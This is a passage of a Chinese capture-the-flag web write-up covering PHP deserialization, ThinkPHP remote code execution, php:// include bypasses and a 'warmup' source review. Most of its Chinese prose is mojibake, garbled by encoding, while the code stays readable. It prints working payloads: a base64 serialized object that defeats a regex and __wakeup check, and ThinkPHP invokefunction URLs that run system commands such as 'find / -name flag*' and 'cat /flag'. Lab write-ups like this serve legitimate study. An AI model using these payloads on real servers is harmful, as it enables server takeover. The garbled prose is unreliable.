ç»“æœ%61å†æ¬¡ç¼–ç è€Œæˆ</p><p>â€“ä¸ºäº†payloadç®€æ´ï¼Œä¸€èˆ¬åªç¼–ç ä¸€ä¸ªå­—æ¯</p><p><img src="/2022/06/21/Gongfang-wp/image-20220626110642311.png" alt="image-20220626110642311"></p><p>å¾—åˆ°flag</p><h2 id="5-Web-python-template-injection"><a href="#5-Web-python-template-injection" class="headerlink" title="5.Web_python_template_injection"></a>5.Web_python_template_injection</h2><p>è¯¥é¢˜å±äºsstiï¼Œå»ºè®®å…ˆäº†è§£ä¸€äº›<a href="../../../../2022/05/28/Web-study">ssti</a>çš„æ¨¡æ¿æ³¨å…¥ï¼Œå’Œè¿™ä¸¤ç¯‡æ–‡ç« äº†è§£ä¸€äº›flaskè¿è¡ŒåŸç†</p><p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a>  </p><p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p><p>ç„¶åå†åšè¿™é“é¢˜</p><p><a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">å¤§ä½¬wp</a></p><h2 id="6-Web-php-unserialize"><a href="#6-Web-php-unserialize" class="headerlink" title="6.Web_php_unserialize"></a>6.Web_php_unserialize</h2><h3 id="1-é¢˜ç›®æè¿°-15"><a href="#1-é¢˜ç›®æè¿°-15" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-13"><a href="#2-wp-13" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åå­—å¯çŸ¥ï¼Œè¿™æ˜¯é“<a href="../../../../2022/05/28/Web-study">phpååºåˆ—åŒ–</a>ç±»å‹çš„é¢˜</p><p>å¼€å§‹å…ˆåˆ†æä¸€ä¸‹phpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/yanbai3/article/details/122300480">phpä»£ç å®¡è®¡åŸæ–‡é“¾æ¥</a></p><p>é¦–å…ˆå®šä¹‰äº†Demoç±»ï¼Œåœ¨ç±»ä¸­å®šä¹‰äº†å‡ ä¸ªæ–¹æ³•<code>construct()wakeup()destruct()</code>ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬è¦çŸ¥é“ï¼Œ</p><p>phpä¸­<u><strong>ç±»å®ä¾‹åŒ–çš„æ—¶å€™ï¼Œé¦–å…ˆè¿è¡Œwakeup()å‡½æ•°</strong></u>ï¼Œ</p><p>åœ¨<u><strong>åºåˆ—åŒ–æ—¶å…ˆè¿è¡Œsleep()å‡½æ•°</strong></u>,</p><p>åœ¨<u><strong>ååºåˆ—åŒ–æ—¶å…ˆè¿è¡Œwakeup()</strong></u>ï¼Œ</p><p>åœ¨<u><strong>è„šæœ¬ç»“æŸè°ƒç”¨destruct()å‡½æ•°</strong></u>ã€‚ </p><p>ç»§ç»­å®¡è®¡ä»£ç ï¼Œä¸‹é¢çš„<code>if</code>è¯­å¥ä¸­ï¼Œå…ˆç”¨äº†<code>base64</code>çš„è§£ç å‡½æ•°ï¼Œè¿›è¡Œäº†ä¸€æ¬¡è§£ç ï¼Œåˆç”¨ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œè¿‡æ»¤ï¼Œåªæœ‰<code>base64</code>ç¼–ç å¹¶é€šè¿‡æ­£åˆ™è¡¨ç¤ºå¼æ‰èƒ½è¿›è¡Œååºåˆ—åŒ–</p><p><img src="https://img-blog.csdnimg.cn/2a59ae6529004d458c4321c9d547fd00.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œçš„æ­£åˆ™è¡¨è¾¾å¼<code>â€™/[oc]:\d+:/iâ€™</code> è¡¨ç¤ºäº†<code>ä»¥Oæˆ–è€…Cå¼€å¤´</code>æ¥ï¼šæ¥æ•°å­—ï¼Œæ•°å­—è‡³å°‘å‡ºç°ä¸€æ¬¡æˆ–è€…æ— æ•°æ¬¡ï¼Œå¿½ç•¥å¤§å°å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†<code>O:4æ”¹ä¸ºO:+4</code>åˆ™å¯é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼Œå› ä¸ºåœ¨PHPä»£ç é‡Œï¼Œ<code>+4</code>å°±æ˜¯<code>4</code>ï¼Œæ‰€ä»¥ç»•è¿‡äº†æ­£åˆ™åŒ¹é…åŒæ—¶ä¹Ÿä¸å½±å“ä»£ç æ­£å¸¸å«ä¹‰</p><p>è¿™é‡Œçœ‹åˆ°äº†<code>fl4g.php</code>ï¼Œå…ˆæŠŠå®ƒå®ä¾‹åŒ–ï¼Œè¿™é‡Œæ”¹ä¸€ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&quot;fl4g.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™é‡Œæˆ‘å°±åœ¨æƒ³ï¼Œå¦‚æœè¿™ä¸ªå®ä¾‹åŒ–çš„æ—¶å€™()ä¸åŠ å‚æ•°ï¼Œé‚£ä¹ˆæœ€ååºåˆ—åŒ–çš„ç»“æ„åªèƒ½æ˜¯index.phpï¼Œä¹Ÿå°±æ˜¯æºç ä¸­çš„ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ç›®æ ‡æ˜¯fl4g.phpè¿™ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="comment">//è¿™é‡Œå…¶å®åªéœ€è¦åœ¨å®ä¾‹åŒ–ç±»ä¸­ï¼Œä¼ å…¥æˆ‘ä»¬éœ€è¦åºåˆ—åŒ–çš„å‚æ•°å³å¯</span></span><br><span class="line"><span class="comment">//è¿™é‡Œç›¸å½“äºç»™$flieèµ‹å€¼ï¼Œå¦‚æœç±»ä¸­å¤šä¸ªå€¼éœ€è¦å˜æˆæˆ‘ä»¬éœ€è¦çš„å‚æ•°ï¼Œç”¨&quot;,&quot;éš”å¼€å³å¯ï¼ŒæŒ‰èµ‹å€¼é¡ºåºï¼Œä¾‹å¦‚$a = new Demo(&quot;a&quot;,2,&quot;b&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://tool.lu/coderunner/">è¿è¡ŒPHPä»£ç </a></p><p>å¾—åˆ°<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p><p>è¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ª<code>__wakeup</code>ï¼Œæ‰€ä»¥è¿˜è¦æ”¹ä¸€ä¸‹å±æ€§å€¼<code>1ä¸º2</code></p><p>â€“&gt;</p><p><code>O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p><p><strong>æ³¨æ„ï¼š</strong>è¿™é‡Œæœ‰ä¸€ä¸ªå¤§å‘è®©æˆ‘å¡äº†å¥½ä¹…</p><p>å…ˆçœ‹ä¸‹é¢è¿™ä¸ªå›¾ç†è§£ä¸€ä¸‹ä¸Šé¢çš„è¯­å¥</p><p><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>å±æ€§å€¼ä¸º10ï¼Œä½†æ˜¯â€<code>Demofile</code>â€œåªæœ‰8ä¸ªå­—ç¬¦ï¼Œå¾ˆæ˜æ˜¾ç¼ºäº†ä¸¤ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯å´è¢«çœç•¥äº†ï¼ŒçŒœæµ‹ç¡®äº†<strong>ä¸¤ä¸ªç©ºå­—ç¬¦</strong></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š<span class="number">0</span>çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ä¹Ÿå¯ä»¥æ¨æµ‹å‡ºDemofileæ˜¯<span class="keyword">private</span>å£°æ˜</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä¸€ç›´å¡ä½çš„<u>åŸå› å°±æ˜¯æŠŠç©ºå­—ç¬¦å½“ä½œäº†ç©ºæ ¼</u></p><p>æ‰€ä»¥å¼€å§‹æˆ‘æ˜¯ç›´æ¥åœ¨Då’Œfå‰åŠ ä¸Šç©ºæ ¼ï¼Œä½†æ˜¯åº•ä¸‹çš„base64ç¼–ç æäº¤urlæ²¡æœ‰ååº”</p><p><img src="/2022/06/21/Gongfang-wp/image-20220628214059503.png" alt="image-20220628214059503"></p><p>ç„¶åæŠŠdecoderæ¢æˆhexï¼Œå‘ç°ç©ºæ ¼æ˜¯20ï¼ˆ44æ˜¯å­—æ¯Dï¼Œ66æ˜¯å­—æ¯fï¼‰</p><p><img src="/2022/06/21/Gongfang-wp/image-20220628233504338.png" alt="image-20220628233504338"></p><p>ç„¶åçœ‹äº†ä¸‹é¢è¿™ä¸ªè¡¨ï¼Œæ˜ç™½00æ‰æ˜¯ç©ºå­—ç¬¦ï¼Œç©ºæ ¼å’Œç©ºå­—ç¬¦ä¸æ˜¯åŒä¸€ä¸ªä¸œè¥¿</p><p><img src="/2022/06/21/Gongfang-wp/image-20220628213218629.png" alt="image-20220628213218629"></p><p>ä½†æ˜¯ç©ºå­—ç¬¦æ— æ³•å¤åˆ¶ï¼Œåœ¨å¤åˆ¶æ—¶ï¼Œç©ºå­—ç¬¦åçš„å­—ç¬¦ä¸²ä¼šè¢«æˆªæ–­ï¼Œåªå¤åˆ¶äº†ç©ºå­—ç¬¦å‰é¢çš„å­—ç¬¦ä¸²</p><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥åœ¨hexé‡Œç›´æ¥æ”¹ï¼ŒæŠŠ20æ”¹æˆ00</p><p><img src="/2022/06/21/Gongfang-wp/image-20220628233851825.png" alt="image-20220628233851825"></p><p>ç„¶åä¸‹æ–¹çš„base64ç¼–ç å°±å¯ä»¥äº†</p><p>è®¿é—®</p><p><code>http://111.200.241.244:50547/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><p>å¾—åˆ°flag</p><h2 id="7-php-rce"><a href="#7-php-rce" class="headerlink" title="7.php_rce"></a>7.php_rce</h2><h3 id="1-é¢˜ç›®æè¿°-16"><a href="#1-é¢˜ç›®æè¿°-16" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-14"><a href="#2-wp-14" class="headerlink" title="2)wp"></a>2)wp</h3><p>å¼€å§‹ç•Œé¢å¦‚ä¸‹</p><p><img src="/2022/06/21/Gongfang-wp/image-20220630174402928.png" alt="image-20220630174402928"></p><p>ï¼ˆçœ‹åˆ°thinkphpæˆ‘å°±æƒ³èµ·ä»Šå¹´å›½èµ›ä¹Ÿæœ‰ä¸€é“think PHPçš„é¢˜ï¼Œçˆ†0ï¼Œéº»äº†ï¼‰</p><p>è¿™é‡Œå¯ä»¥å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯<a href="../../../../2022/05/28/Web-study">rce</a>å’Œè¯¥æ¼æ´çš„æˆå› </p><p>å¦‚æœè¿™é‡Œç‰ˆæœ¬çš„thinkphpå­˜åœ¨rceçš„æ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡æŒ‡ä»¤è·å–flag</p><p>ç™¾åº¦å¯çŸ¥</p><p><code>ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31ç‰ˆæœ¬åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡è¯¥æ¼æ´å¯èƒ½å®Œå…¨æ§åˆ¶WebæœåŠ¡å™¨ã€‚</code> </p><p>ç„¶ååœ¨Githubä¸Šæœthinkphpå¾—åˆ°<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">payload</a></p><p><img src="/2022/06/21/Gongfang-wp/image-20220630174951670.png" alt="image-20220630174951670"></p><p>å°è¯•<code>http://111.200.241.244:51053/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p><p>äº†è§£åˆ°æœ€åçš„idå¤„ä¸ºå‘½ä»¤æ‰§è¡Œè¯­å¥è¾“å…¥å¤„ï¼Œç”¨ findè¯­å¥æŸ¥çœ‹æœ‰æ²¡æœ‰flagæ–‡ä»¶</p><p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name flag*</code></p><p><img src="/2022/06/21/Gongfang-wp/image-20220630175318946.png" alt="image-20220630175318946"></p><p>å¾—åˆ°çš„ç»“æœå¾ˆä¹±ï¼Œç”¨F12æ•´æ´ä¸€äº›</p><p>æœ€åè¡Œï¼Œçœ‹åˆ°flagæ–‡ä»¶å¤¹</p><p><img src="/2022/06/21/Gongfang-wp/image-20220630175432667.png" alt="image-20220630175432667"></p><p>ç”¨catæ˜¾ç¤ºå‡ºæ¥</p><p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></p><p>å¾—åˆ°flag</p><h2 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h2><h3 id="1-é¢˜ç›®æè¿°-17"><a href="#1-é¢˜ç›®æè¿°-17" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-15"><a href="#2-wp-15" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜å…ˆäº†è§£<a href="../../../../2022/05/28/Web-study">phpä¼ªåè®®</a></p><p>çœ‹åå­—å¾ˆæ¸…æ¥šæ˜¯åˆ°æ–‡ä»¶åŒ…å«çš„é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;  <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆåˆ†æä¸€ä¸‹å‡½æ•°</p><p><code>strstr()ï¼š</code><br><code>å®šä¹‰å’Œç”¨æ³•ï¼š</code><br><code>æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œè¿”å›å­—ç¬¦ä¸²åŠå‰©ä½™éƒ¨åˆ†ï¼Œå¦åˆ™è¿”å›falseã€‚</code><br><code>åŒºåˆ†å¤§å°å†™ï¼Œstristr()å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™</code><br><code>è¯­æ³•ï¼š</code><br><code>strstr(string,search,before_search)</code><br><code>string:å¿…éœ€ï¼Œè¢«æœç´¢çš„å­—ç¬¦ä¸²</code><br><code>search:å¿…éœ€ï¼Œè¦æœç´¢çš„å­—ç¬¦ä¸²ï¼Œè‹¥æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢å¯¹åº”çš„ASCIIå€¼çš„å­—ç¬¦</code><br><code>before_searchï¼šå¯é€‰ï¼Œé»˜è®¤ä¸ºâ€œfalseâ€ï¼Œè‹¥ä¸ºtrue,å°†è¿”å›searchå‚æ•°ç¬¬ä¸€æ¬¡å‡ºç°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ¨åˆ†</code></p><p><code>str_replace():</code><br><code>å®šä¹‰å’Œç”¨æ³•ï¼š</code><br><code>ä»¥å…¶å®ƒå­—ç¬¦æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</code><br><code>è¯­æ³•ï¼š</code><br><code>str_replace(find,replace,string,count)</code><br><code>find,å¿…éœ€ï¼Œè¦æŸ¥æ‰¾çš„å€¼</code><br><code>replaceï¼Œå¿…éœ€ï¼Œè¦æ›¿æ¢çš„å€¼</code><br><code>stringï¼Œå¿…éœ€ï¼Œè¢«æœç´¢çš„å­—ç¬¦ä¸²</code><br><code>countï¼Œå¯é€‰ï¼Œæ›¿æ¢æ¬¡æ•°</code></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœpage&#x3D;çš„å†…å®¹é‡Œæœ‰php:&#x2F;&#x2F;å°±ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯è¿‡æ»¤</p><p>ä½†æ˜¯çœ‹æºç æˆ‘ä»¬çŸ¥é“ï¼Œå®ƒåªè¿‡æ»¤äº†å°å†™ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ï¼Œè¿™é‡Œç”¨çš„php:&#x2F;&#x2F;input</p><p>*è¿™é“é¢˜å¥½åƒåŒ…æ‹¬php:&#x2F;&#x2F;inputï¼Œæœ‰5ç§æ–¹æ³•ï¼Œå»ºè®®çœ‹çœ‹è¿™ç¯‡æ–‡ç« <a href="https://blog.csdn.net/yingyugo/article/details/109783035?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&utm_relevant_index=1">Web_php_includeæ€»ç»“äº”ç§è§£æ³•å¤§åŒå°å¼‚</a></p><p><code>http://111.200.241.244:59492/?page=PHP://input</code></p><p>php:&#x2F;&#x2F;inputè¯»å–POSTæ•°æ®ï¼Œ æˆ‘å…ˆç”¨hackbarï¼Œå‘ç°æ²¡æœ‰ååº”</p><p><img src="/2022/06/21/Gongfang-wp/image-20220626215410026.png" alt="image-20220626215410026"></p><p>çœ‹äº†ä¸€ç¯‡å¤§ä½¬çš„wpï¼Œè¯´æ˜¯è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸è¡Œ</p><p>ä½†è¿™é‡Œå¯ä»¥ç”¨burpè¯•è¯•ï¼Œå¾—åˆ°flagæ–‡ä»¶å</p><p>fl4gisisish3r3.php</p><p><img src="/2022/06/21/Gongfang-wp/image-20220626222916776.png" alt="image-20220626222916776"></p><p>æ˜¾ç¤ºfl4gisisish3r3.phpå†…å®¹</p><p><img src="/2022/06/21/Gongfang-wp/image-20220626223253399.png" alt="image-20220626223253399"></p><p>å¾—åˆ°flag</p><h2 id="9-supersqli"><a href="#9-supersqli" class="headerlink" title="9.supersqli"></a>9.supersqli</h2><h3 id="1-é¢˜ç›®æè¿°-18"><a href="#1-é¢˜ç›®æè¿°-18" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>éšä¾¿æ³¨</p><h3 id="2ï¼‰wp-3"><a href="#2ï¼‰wp-3" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¿™é“é¢˜ä¹‹å‰åœ¨buuctfä¸Šåšè¿‡ï¼Œè€ƒå¯Ÿå †å æ³¨å…¥ï¼Œwpå¯ä»¥åœ¨<a href="../../../../2022/06/21/buuctf-wp">buuctf-wp</a>çœ‹ä¸€ä¸‹</p><h2 id="10-warmup"><a href="#10-warmup" class="headerlink" title="10.warmup"></a>10.warmup</h2><h3 id="1-é¢˜ç›®æè¿°-19"><a href="#1-é¢˜ç›®æè¿°-19" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2ï¼‰wp-4"><a href="#2ï¼‰wp-4" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>å¼€å§‹å°±åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œå…ˆçœ‹ä¸€ä¸‹å®ƒæºç </p><p><img src="/2022/06/21/Gongfang-wp/image-20220703104834305.png" alt="image-20220703104834305"></p><p>çœ‹åˆ°æœ‰ä¸€ä¸ªsource.phpæ–‡ä»¶</p><p>è®¿é—®<code>http://111.200.241.244:59132/source.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="comment">//__FILE__å¸¸é‡è¿”å›æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åï¼Œé«˜äº®æ˜¾ç¤º</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span 